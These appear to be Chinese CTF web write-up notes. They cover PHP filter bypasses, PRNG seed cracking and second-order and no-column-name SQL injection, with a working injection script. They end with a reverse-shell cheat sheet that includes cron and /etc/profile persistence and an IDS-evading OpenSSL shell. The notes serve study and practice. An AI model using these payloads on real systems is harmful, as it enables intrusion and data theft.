    但是过滤了空格，`'`,`;`,`php`,`eval`,`_`

2. 一开始看到以为是传木马用蚁剑连接，试了好几次没成功，后来才发现不是，其实就是简单的命令执行。`_`被过滤，所以用不了木马

3. 过滤绕过

    ```php
    'php'：导致'<?php ?>'不能用，可以用短标签 ‘<?= ?>’ 绕过

    'eval':可以用反引号(``)替换,php会尝试将反引号中的内容当作系统shell执行

    ' ':空格被过滤，linux系统中可以用'${IFS}'绕过

    像'php','eval'这些被过滤，也可以用'.'连接进行绕过,如'p.hp','e.val'等

    如果一句话木马可用('_'没有被过滤)，assert和eval可以互换，如：
    <?php
    @assert($_GET["cmd"]);
    ?>

    php执行系统命令：
    //shell_exec函数可执行但需要加echo才能显示结果
    shell_exec("ls")

    //system函数可执行并直接显示结果
    system("ls")

    //function exec(命令，以数组形式的保存结果，命令执行的状态码)
    //可执行，但需要加echo才能显示结果;
    //单执行exec的话只会显示结果最后一行，下方两个命令组合执行便可以显示所有结果
    exec("ls",$a)
    print_r($a)

    //passthru函数可执行并直接显示结果
    passthru("ls")

    //popen函数：打开一个指向进程的管道，该进程由派生指定的 command 命令执行而产生。
    //返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）
    //此指针可以用于 fgets()，fgetss() 和 fwrite()。并且必须用 pclose() 来关闭。
    //若出错，则返回 false。
    popen("ls")
    //popen 用法
    printf(fread(popen("ls%09/","r"),1024))

    proc_open()
    `ls`
    ```

## 随机数爆破

### GWCTF 2019 枯燥的抽奖(伪随机数爆破)

**本题会用到一个爆破工具 php_mt_seed, 用来爆破生成随机数的种子**

[php_mt_seed Document](https://www.openwall.com/php_mt_seed/README)

1. 源码

    ```php
    Hg11vtADEm
    <?php
    #这不是抽奖程序的源代码！不许看！
    header("Content-Type: text/html;charset=utf-8");
    session_start();
    if(!isset($_SESSION['seed'])){
    $_SESSION['seed']=rand(0,999999999);
    }

    mt_srand($_SESSION['seed']);
    $str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $str='';
    $len1=20;
    for ( $i = 0; $i < $len1; $i++ ){
        $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
    }
    $str_show = substr($str, 0, 10);
    echo "<p id='p1'>".$str_show."</p>";


    if(isset($_POST['num'])){
        if($_POST['num']===$str){x
            echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
        }
        else{
            echo "<p id=flag>没抽中哦，再试试吧</p>";
        }
    }
    show_source("check.php"); 

    ```

2. 审计源码可以看到字符串是通过一个随机数生成器生成的，然后查了下这个mt_srand()函数，果然存在漏洞

    **mt_srand()函数**的作用是给随机数发生器播种，播种会初始化随机数生成器。语法为mt_srand(seed)，其seed参数为必须。大多数随机数生成器都需要初始种子。在PHP中，因为自动完成，所以mt_srand()函数的使用是可选的。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。播种后mt_rand函数就能使用Mersenne Twister算法生成随机整数。

    但是用这个函数时会存在一些问题，每一次调用mt_rand()函数的时候，都会检查一下系统有没有播种,(播种是由mt_srand()函数完成的)，当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下随机生成的随机数值是相同的。同时，也解释了我们破解随机种子的可行性。如果每次调用mt_rand()函数都需要生成一个随机种子的话，那根本就没办法破解。

    *所以：大致过程就明了了，我们根据已经给出的部分随机数，利用工具找出seed（种子），然后得到完整的随机数。*

3. 爆破seed

    - 将已知的部分伪随机数转化为php_mt_seed工具可以看懂的数据

    ```php
    <?php
    $source = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $target = 'oBQ5bGllcU';
    for ($i = 0; $i < strlen($target); $i++){
        echo strpos($source, $target[$i])." ".strpos($source, $target[$i])." "."0"." ".strlen($source)-1." ";
    }
    ?>
    ```

    - 爆破seed(用 php_mt_seed)

    ```bash
    xking@xking-Ubuntu:~/Downloads/php_mt_seed-4.0$ ./php_mt_seed 14 14 0 61 37 37 0 61 52 52 0 61 31 31 0 61 1 1 0 61 42 42 0 61 11 11 0 61 11 11 0 61 2 2 0 61 56 56 0 61 
    Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62
    Version: 3.0.7 to 5.2.0
    Found 0, trying 0xfc000000 - 0xffffffff, speed 1177.7 Mseeds/s 
    Version: 5.2.1+
    Found 0, trying 0x00000000 - 0x01ffffff, speed 0.0 Mseeds/s 
    seed = 0x016e370f = 24000271 (PHP 7.1.0+)
    Found 1, trying 0xfe000000 - 0xffffffff, speed 52.1 Mseeds/s 
    Found 1
    ```

    得到seed值 `24000271`

4. 爆破flag

    *这一部要注意上面爆破seed时结果输出中的提示 PHP 7.1.0+,这表示，下面脚本运行环境要符合版本要求，否则是爆不出正确结果的*

    ```php
    <?php
    $seed = 24000271;
    mt_srand($seed);
    $source = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $target = 'oBQ5bGllcU';
    $res = "";
    $len = 20;

    while(true){
        for ($i = 0; $i < $len; $i++) {
            $res .= substr($source, mt_rand(0, strlen($source) - 1), 1);
        }
        $front = substr($res, 0, 10);
        if($front === 'oBQ5bGllcU'){
            break;
        }
    }
    echo $res;
    ```
    将得到的结果输入即可返回flag

### MRCTF2020 Ezaudit

1. 进入看了一下源码，没有发现什么有用的信息。然后就是扫描目录，发现源码备份www.zip

    ```php
    <?php 
    header('Content-type:text/html; charset=utf-8');
    error_reporting(0);
    if(isset($_POST['login'])){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $Private_key = $_POST['Private_key'];
        if (($username == '') || ($password == '') ||($Private_key == '')) {
            // 若为空,视为未填写,提示错误,并3秒后返回登录界面
            header('refresh:2; url=login.html');
            echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
            exit;
    }
        else if($Private_key != '*************' )
        {
            header('refresh:2; url=login.html');
            echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
            exit;
        }

        else{
            if($Private_key === '************'){
            $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
            $link=mysql_connect("localhost","root","root");
            mysql_select_db("test",$link);
            $result = mysql_query($getuser);
            while($row=mysql_fetch_assoc($result)){
                echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
            }
        }
        }

    } 
    // genarate public_key 
    function public_key($length = 16) {
        $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $public_key = '';
        for ( $i = 0; $i < $length; $i++ )
        $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
        return $public_key;
    }

    //genarate private_key
    function private_key($length = 12) {
        $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $private_key = '';
        for ( $i = 0; $i < $length; $i++ )
        $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
        return $private_key;
    }
    $Public_key = public_key();
    //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
    ```
    首先是验证私钥private_key,通过后回查数据库，但必须输入正确的密码(*这里可以用万能密码绕过*)。所以目前的重点是获取私钥

    接着下面两个函数分别是生成公钥和私钥的，函数中用到一个mt_rand函数用来生成随机数，到这和之前的一道题目相似 [GWCTF 2019 枯燥的抽奖(伪随机数爆破)](#gwctf-2019-枯燥的抽奖伪随机数爆破),需要先把种子爆破出来，要用php_mt_seed工具

2. 私钥爆破

    1. 把公钥转化为php_mt_seed可以识别的数据

        ```php
        <?php
        $source = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        $target = 'oBQ5bGllcU';
        for ($i = 0; $i < strlen($target); $i++){
            echo strpos($source, $target[$i])." ".strpos($source, $target[$i])." "."0"." ".strlen($source)-1." ";
        }
        ?>
        ```

    2. 爆破seed

        ```bash
        lsz@LSZ-TOP:/mnt/f/ProgramFiles/ctf/php_mt_seed-4.0$ ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61
        Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62
        Version: 3.0.7 to 5.2.0
        Found 0, trying 0xfc000000 - 0xffffffff, speed 901.5 Mseeds/s
        Version: 5.2.1+
        Found 0, trying 0x68000000 - 0x69ffffff, speed 42.5 Mseeds/s
        seed = 0x69cf57fb = 1775196155 (PHP 5.2.1 to 7.0.x; HHVM)
        Found 1, trying 0xfe000000 - 0xffffffff, speed 38.1 Mseeds/s
        Found 1
        ```

    3. 获取私钥

        ```php
        <?php
        $seed = '1775196155';

        mt_srand($seed);

        // genarate public_key 
        function public_key($length = 16) {
            $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            $public_key = '';
            for ( $i = 0; $i < $length; $i++ )
            $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
            return $public_key;
        }

        //genarate private_key
        function private_key($length = 12) {
            $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            $private_key = '';
            for ( $i = 0; $i < $length; $i++ )
            $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
            return $private_key;
        }

        public_key();
        echo private_key();
        ```

        *注意：两个函数必须都跑一下，不然生成的私钥只是公钥的前12位*

        至于原因，在生成私钥之前先生成了公钥，生成公钥的时候已经调用过mt_rand函数，生成私钥的时候其实是第二次调用mt_rand函数。就相当于用mt_rand函数一共生成了28位随机数，但是公钥用的是前16位，后12位才是生成私钥用的。

## SQLi-二次注入

### b01lers2020 Life on Mars

这道题不是二次注入，是个普通的注入题目，从这道题学到一个新的知识点

**从information表查数据库名**

```sql
select group_concat(schema_name) from information_schema.schemata;
```

### RCTF2015-EasySQL(二次注入+报错注入)

**注册页面写入payload，在修改密码界面输出结果**

1. 首页显示注册登录，所以首先注册，可以用bp做一下fuzz测试，看一下关键词过滤
2. 注册时发现只要用户名不包含被过滤的关键词都能注册成功，而且可以登录
3. fuzz测试发现`or`,`and`等关键词都被过滤，而且在登陆界面尝试注入也没有结果
4. 正常登录，发现有修改密码页面，但是正常操作没有回显，但是注册的时候如果写的用户名包含特殊符号，在这个页面就会显示报错信息

    这就是二次注入的特征

    二次注入脚本。

    ```python
    import requests

    url = 'http://6407a4c8-5477-4bc2-a1af-bd1b03c751d6.node5.buuoj.cn:81/'
    reg = 'register.php'
    log = 'login.php'
    change = 'changepwd.php'

    pre = 'mochu7"'
    #逆序闭合
    resuf = "')))),1))#"

    #正序闭合
    suf = "'))),1))#"

    s = 'abcdefghijklmnopqrstuvwxyz1234567890'
    s = list(s)

    r = requests.session()

    def register(name):
        data = {
            'username' : name,
            'password' : '123',
            'email' : '123',
        }
        r.post(url=url+reg, data=data)

    def login(name):
        data = {
            'username' : name,
            'password' : '123',
        }
        r.post(url=url+log, data=data)

    def changepwd():
        data = {
            'oldpass' : '',
            'newpass' : '',
        }
        res = r.post(url=url+change, data=data)
        if 'XPATH' in res.text:
            flag = res.text.split('~')
            print(flag[1])
            # print(res.text)

    for i in s:
        #正序
        # paylaod = pre + "||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + suf
        #逆序
        paylaod = pre + "||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + resuf
        register(paylaod)
        login(paylaod)
        changepwd()


    #正序payload
    #paylaod = pre + "||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "'))),1))#"
    #逆序payload
    #paylaod = pre + "||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "')))),1))#"
    ```

### CISCN2019 华北赛区Day1-web5-CyberPunk(PHP伪协议+二次注入+报错注入)

1. 进入首页查看源码发现提示：`<!--?file=?-->`，尝试php伪协议读取文件，发现成功读取，读取源码之后发现对`username`和`phone`两个字段进行了很多过滤，在这两个字段注入不太可能。在修改地址页面发现修改完地址之后会把旧的地址保存下来，所以我们只要将在第一次修改地址时输入SQL报错注入语句，在第二次更新时（随便输），第一次更新的SQL语句会被调用从而引发二次注入。

    ```php
    require_once "config.php";

    if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
    {
        $msg = '';
        $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
        $user_name = $_POST["user_name"];
        $address = addslashes($_POST["address"]);
        $phone = $_POST["phone"];
        if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
            $msg = 'no sql inject!';
        }else{
            $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
            $fetch = $db->query($sql);
        }

        if (isset($fetch) && $fetch->num_rows>0){
            $row = $fetch->fetch_assoc();
            $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
            $result = $db->query($sql);
            if(!$result) {
                echo 'error';
                print_r($db->error);
                exit;
            }
            $msg = "订单修改成功";
        } else {
            $msg = "未找到订单!";
        }
    }else {
        $msg = "信息不全";
    }
    ```

###  网鼎杯2018 comment

*知识点*

- git泄露
- 二次注入
- SQL文件读取
- 特殊文件识别利用

**过程**
1. dirsearch 扫面网站目录，发现git泄露
2. 尝试发帖的时候，跳转到登录页，账号密码输入框里有提示，就用bp爆破了一下密码，得到密码后三位是666
3. GitHack获取后端源码，下完后发现源码很少，这种情况就是源码不全

    `git log`一下，发现是空的，只有自己下载的那个记录。

    `git log --reflog`发现几个提交，看wp说console处也有提示
    >程序员GIT写一半跑路了,都没来得及Commit :)

    >git log --reflog 查看所有分支的所有操作记录（包括已经被删除的commit记录和reset的操作）

    `git reset --hard commit记录` 还原源码

    ```php
    <?php
    include "mysql.php";
    session_start();
    if($_SESSION['login'] != 'yes'){
        header("Location: ./login.php");
        die();
    }
    if(isset($_GET['do'])){
    switch ($_GET['do'])
    {
    case 'write':
        $category = addslashes($_POST['category']);
        $title = addslashes($_POST['title']);
        $content = addslashes($_POST['content']);
        $sql = "insert into board
                set category = '$category',
                    title = '$title',
                    content = '$content'";
        $result = mysql_query($sql);
        header("Location: ./index.php");
        break;
    case 'comment':
        $bo_id = addslashes($_POST['bo_id']);
        $sql = "select category from board where id='$bo_id'";
        $result = mysql_query($sql);
        $num = mysql_num_rows($result);
        if($num>0){
        $category = mysql_fetch_array($result)['category'];
        $content = addslashes($_POST['content']);
        $sql = "insert into comment
                set category = '$category',
                    content = '$content',
                    bo_id = '$bo_id'";
        $result = mysql_query($sql);
        }
        header("Location: ./comment.php?id=$bo_id");
        break;
    default:
        header("Location: ./index.php");
    }
    }
    else{
        header("Location: ./index.php");
    }
    ?>
    ```
4. SQL注入

    addslashes()函数，这个函数会把特殊的字符转义。就是在特殊字符前加一个`\`，想到之前做的一道题[CISCN2019-easyweb](#ciscn2019-总决赛day2-web1easyweb),利用加的`\`来注释后面的一个单引号，但是这道题不是这样做的
    >数据库会自动清除反斜杠

    所以如果`addslashes()`处理的值往数据库里走一圈，相当于没处理。

    ```php
    $category = mysql_fetch_array($result)['category'];
    ```
    catefory 从数据库中取值，漏洞在这

    但是注意，这道题目代码中换行写sql语句，那么写入数据库的sql语句也是有换行的，所以单纯用`#`注释sql语句就不行了。这时要`#`和`/**/`(多行注释)结合起来

    第一次write时
    ```url
    title=1&category=1'content=user(),/*&content=aaa
    ```
    第二次评论时
    ```hurl
    content=*/#&bo_id=1
    ```
    最终会形成
    ```mysql
    insert into comment
        set category = '1',content=user(),/*',
            content = '*/#',
            bo_id = '$bo_id'
    ```
    第二行的/*与第三行的*/遥相呼应，将中间的给注释了，而第三行的#，将后面的单引号和逗号给注释了。

    第四行还有一句不能忽略，所以那个逗号也需要加。

    write加上comment就完成了一次完成的sql注入，write时`content=user()`部分的`user()`可以换成sql查询语句，从而可以进行数据库字段爆破。当爆破出来列以后会发现没有flag相关信息。

    看wp上说，user()那有提示`root@localhost`
    >说明flag不在数据库而在本地文件里，需要读取。在数据库中无需root权限。

    读/etc/passwd,发现www用户信息
    >一般设置web的都是www用户，所以找www。
    >找到www用户目录/home/www/

    读www用户历史命令

    ```url
    1',content=(select load_file('/home/www/.bash_history')),/*
    ```
    发现了一些文件操作信息
    ```bash
    cd /tmp/
    unzip html.zip
    rm -f html.zip
    cp -r html /var/www/
    cd /var/www/html/
    rm -f .DS_Store
    service apache2 start
    ```
    删除了`/var/www/html/.DS_Store`

    但是没删`/tmp/html/.DS_Store`
    >.DS_Store是Mac OS保存文件夹的自定义属性的隐藏文件，如文件的图标位置或背景色，相当于Windows的desktop.ini。经常会有一些不可见的字符

    读取.DS_Store文件
    ```url
    1',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
    ```
    16进制解码得到存放flag的文件，上面的payload更换文件名，读取解码得到flag

    *读DS_Store时，不用hex转码的话会因为乱码导致读不全，读flag时不用hex转码也读不出来*

### 网鼎杯2018 unfinish

1. 进入是登录界面，尝试访问`/register.php`，成功，注册了一个账号，登录，有显示头像和用户名，然后看了几个页面的源码，没发现什么东西，dirsearch扫描的结果和自己猜的一样
2. 猜测可能是二次注入，注入点在用户名上，对注入点进行了一个关键字fuzz测试，发现过滤了information和",",尝试在用户名处注入，发现无效。
3. 看了wp才知道，# 和 -- 注释无效。这里要用一种新的注入方式，sql中字符串相加来注入，sql和php一样都是弱类型，看下方例子

    ```sh
    mysql> select '1' + '2a2';
    +-------------+
    | '1' + '2a2' |
    +-------------+
    |           3 |
    +-------------+
    1 row in set, 1 warning (0.00 sec)
    ```
    因为注释无效，所以我们要想办法来闭合代码中的引号，而sql可以进行字符串和数的相加，那么就可以构造如下的payload

    ```mysql
    0'+ascii(substr((select * from flag) from 1 for 1))+'0
    ```
    需要注意的是，这道题过滤了information，而这道题数据库的版本是5.6以下的，所以没办法查表名，只能靠盲猜。

4. 注入脚本[sqli_plus.py](./sqli_plus.py)

### October 2019 Twice SQL Injection

1. 这道题题目就给了提示，二次注入。所以猜测在注册时写入payload，登录后会在某个地方给出提示。
2. 一开始先正常注册登录，发现有个修改简介的地方，以为注入点在这，在简介处试了一下payload，发现关键字符都被加了反斜杠，注入点不在这里。这印证了最开始的猜测。
3. 开始注入，在注册时填入用户名 "a'",登录后修改简介，返回了错误信息"修改失败"，所以以为是盲注，测试了好几种payload发现都不行，就尝试了一下联合查询，登陆后居然有回显，所以就是普通的二次注入+联合查询注入。

## 无列名注入
### 前言
mysql information_schema库被禁
### 替代
1. 获取有自增主键的表的数据
    ```mysql
    sys.schema_auto_increment_columns #该视图的作用简单来说就是用来对表自增ID的监控
    ```
2. 获取没有自增主键的表的数据
    ```mysql
    sys.schema_table_statistics_with_buffer     sys.x$schema_table_statistics_with_buffer
    ```
3. 类似的表还有：`mysql.innodb_table_stats`,`mysql.innodb_table_index`都存放有库名表名

### 无列名注入
上面提到的表只能获取数据库中表的信息，但是不能获得表中列的信息

#### 利用join
1. join-using注列名：

    通过系统关键词join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因(相同列名存在)，而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。

    - 爆表

        ```mysql
        # schema_auto_increment_columns
        ?id=-1' union all select 1,2,group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()--+

        # schema_table_statistics_with_buffer
        ?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
        ```
    - 获取字段名

        ```mysql
        获取第一列的列名
        ?id=-1' union all select * from (select * from users as a join users as b)as c--+

        获取次列及后续列名
        ?id=-1' union all select * from (select * from users as a join users b using(id,username))c--+

        ?id=-1' union all select*from (select * from users as a join users b using(id,username,password))c--+

        数据库中as主要作用是起别名，常规来说都可以省略，但是为了增加可读性，不建议省略。
        ```
2. 利用普通子查询

    ```mysql
    select 1,2,3,4,5 union select * from users;      #前提是先尝试出sql中总共有几个列
    ```

    接着，就可以继续使用数字来对应列进行查询，如3对应了表里面的pass：

    ```mysql
    select `3` from (select 1,2,3,4,5 union select * from users)a;
    # 就相当于select pass from (select 1,2,3,4,5 union select * from users)a;
    ```

    "`"被过滤，可以用别名代替

    ```mysql
    select b from (select 1,2,3 as b,4,5 union select * from users)a;

    select group_concat(b,c) from (select 1,2,3 as b,4 as c,5 union select * from users)a;  # 在注入中查询多个列
    ```

3. 加括号诸位比较大小(ascii偏移)

    **GYCTF2020 Ezsqli**

    当union select被过滤时，以上两种方法就都不能用了，我们要用加括号逐位比较大小的方法，将flag诸位爆出来，就像这样：

    ```mysql
    1&&((select 1,"f")>(select * from flag_is_here))
    ```

    用布尔来进行判断。一般出现在布尔盲注的地方。

    一个post的输入框，存在sql盲注注入（正确则回显Nu1L）。但是过滤了很多东西，or、and、union、information_schema、sys.schema_auto_increment_columns、join等都不能用了。我们要是用sys.schema_table_statistics_with_buffer来绕过information_schema，先把表给爆出来([sqli_blind.py](./sqli_blind.py))

    payload:
    ```python
    payload = f" or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),{i},1))>{mid})#"
    ```

    *注意：这道题脚本爆破时要加一个延迟，不然爆不出来*

    下面是爆flag，但是union select被禁，上面两种方法不能用，这时就可以用ascii位偏移

    ascii位偏移举例,

    ```cmd
    mysql> select ((select 1,'flag')>(select 1,'flag{asdf-qwer-zxcv-uiop-hjkl}'));
    +-----------------------------------------------------------------+
    | ((select 1,'flag')>(select 1,'flag{asdf-qwer-zxcv-uiop-hjkl}')) |
    +-----------------------------------------------------------------+
    |                                                               0 |
    +-----------------------------------------------------------------+
    1 row in set (0.00 sec)

    mysql> select ((select 1,'flah')>(select 1,'flag{asdf-qwer-zxcv-uiop-hjkl}'));
    +-----------------------------------------------------------------+
    | ((select 1,'flah')>(select 1,'flag{asdf-qwer-zxcv-uiop-hjkl}')) |
    +-----------------------------------------------------------------+
    |                                                               1 |
    +-----------------------------------------------------------------+
    1 row in set (0.00 sec)

    mysql> select ((select 1,'flag')>(select 1,'flag'));
    +---------------------------------------+
    | ((select 1,'flag')>(select 1,'flag')) |
    +---------------------------------------+
    |                                     0 |
    +---------------------------------------+
    1 row in set (0.00 sec)
    ```

    *关于mysql中ascii位偏移大小关系：`数字>字母>字符型数字`*

    判断列数: `0^((1,1)>(select * from f1ag_1s_h3r3_hhhhh))`,如果列数大于2的话是不会返回预期结果的。

    当我们匹配flag的时候，一定会先经过匹配到字符相等的情况，这一这个时候返回的是0，对应题目中的V&N，很明显此时的chr(char)并不是我们想要的，我们在输出1(Nu1L)的时候，匹配的是f的下一个字符g，而我们想要的是f，此时`chr(char-1)='f'`，所以这里要用`chr(char-1)`

## SQL盲注-regexp注入

### NCTF2009SQLi
1. 这道题看到题目时sql注入，就没管其他的,结果试了半天没一点进展，只测试出了一堆关键字被过滤。
2. 所以不管哪类Web类型题目，第一步都应该是信息收集，看源码，扫描目录，除非是有明确提示。网上查了才知道有robots.txt,然后robots.txt中提示hint.txt
3. 提示中说只要拿到admin密码就可以拿到flag，但是大部分关键词都被过滤，这时看到一种之前从没有见过的注入方法，正则注入，就是用正则表达式去匹配查询结果，从而爆破出想要的值，但是这里有个注意点，用正则表达式去匹配的时候要注意去掉通配符(*,+),不然会匹配一堆乱七八糟的东西。所以不能直接用python string库中的标点符号常量
4. 脚本：[sqli_regexp.ph](./sqli_regexp.py)

## 网鼎杯2020-白虎组PicDown(任意文件读取+shell反弹)

- 反弹shell

    参考[反弹Shell，看这一篇就够了](https://xz.aliyun.com/t/9488?time__1311=n4%2BxuDgD9AdWqhDBqDwmDUhRDB0rC3eDRioD&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F)

    *注意:攻击主机需要在防火墙中开启8080端口，而且攻击主机需要有公网IP或者与被攻击主机位于同一内网中，否则无法反弹shell*

    1. 利用netcat反弹shell

        下载安装netcat
        ```sh
        wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz
        tar -xvzf netcat-0.7.1.tar.gz
        ./configure
        make && make install
        make clean
        ```

        攻击机开启本地监听：
        ```sh
        nc -lvvp 8080
        ```

        目标主动连接攻击者
        ```sh
        netcat 221.xxx.xxx.82 8080 -e /bin/bash
        # nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
        ```
    2. 利用Bash反弹shell

        反弹shell还有一种好用的方法就是使用bash结合重定向方法的一句话，具体命令如下
        ```sh
        bash -i >& /dev/tcp/221.xxx.xxx.82/4333 0>&1
        #或
        bash -c "bash -i >& /dev/tcp/221.xxx.xxx.82/4333 0>&1"
        # bash -i >& /dev/tcp/攻击机IP/攻击机端口 0>&1
        ```
        攻击机开启本地监听：
        `nc -lvvp 8080`

        目标机主动连接攻击机：
        `bash -i >& /dev/tcp/221.xxx.xxx.82/8080 0>&1`
        并开启8080端口的监听。

        然后再目标机上执行如下，即可反弹shell：
        `curl 221.xxx.xxx.82|bash`
    3. Curl配合Bash反弹shell
        这里操作也很简单，借助了Linux中的管道。

        首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：`bash -i >& /dev/tcp/47.xxx.xxx.72/8080 0>&1`
        并开启8080端口的监听。

        然后再目标机上执行如下，即可反弹shell：`curl 47.xxx.xxx.72|bash`
        **将反弹shell的命令写入定时任务**

        我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/[crontabs]/ 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。

        比如，当前用户名为root，我们就要将下面内容写入到 `/var/spool/cron/root` 中。(centos系列主机)

        比如，当前用户名为root，我们就要将下面内容写入到 `/var/spool/cron/crontabs/root` 中。(Debian/Ubuntu系列主机)

        ```bash
        */1  *  *  *  *   /bin/bash -i>&/dev/tcp/221.xxx.xxx.82/8080 0>&1
        #每隔一分钟，向221.xxx.xxx.82的4333号端口发送shell
        ```

        **将反弹shell的命令写入/etc/profile文件**

        将以下反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。
        ```bash
        /bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 &
        # 最后面那个&为的是防止管理员无法输入命令
        ```
    4. 使用OpenSSL反弹加密shell

        在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。

        在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：
        `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes`

        生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可

        使用OpenSSL反弹加密shell
        假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 8080 端口：
        ```sh
        openssl s_server -quiet -key key.pem -cert cert.pem -port 2333
        ```
        此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL/TLS server。

        这时在目标机进行反弹 shell 操作，命令为：
        ```sh
        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 > /tmp/s; rm /tmp/s
        ```
        这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。

    5. 反弹shell脚本

        **下面这些脚本都是在目标主机上执行的**

        python:
        ```python
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
        ```
        php:
        ```php
        php -r '$sock=fsockopen("47.xxx.xxx.72",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
        ```
        perl:
        ```perl
        perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        ```
        Ruby:
        ```Ruby
        ruby -rsocket -e 'c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
        #或
        ruby -rsocket -e 'exit if fork;c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
        ```

